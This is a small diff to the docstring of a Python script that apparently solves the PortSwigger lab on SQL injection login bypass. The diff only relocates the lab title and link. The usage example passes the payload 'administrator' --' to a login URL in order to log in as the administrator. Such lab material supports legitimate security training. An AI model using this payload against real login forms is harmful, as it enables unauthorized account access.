@@ -7,9 +7,11 @@ import signal
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 """ 02_loginbypass.py ##########################################################
+Lab: SQL injection vulnerability allowing login bypass
+https://portswigger.net/web-security/sql-injection/lab-login-bypass
+
 02_loginbypass.py <exploit_type> <url> <sql-payload> <text-to-search>"
 python3 02_loginbypass.py lb "https://website.net/login" "administrator' --" "Log out"'
-https://portswigger.net/web-security/sql-injection/lab-login-bypass"
 
 SQLi vulnerability in the login function. This is an SQL injection attack where 
 you can log in to the application as the administrator user.
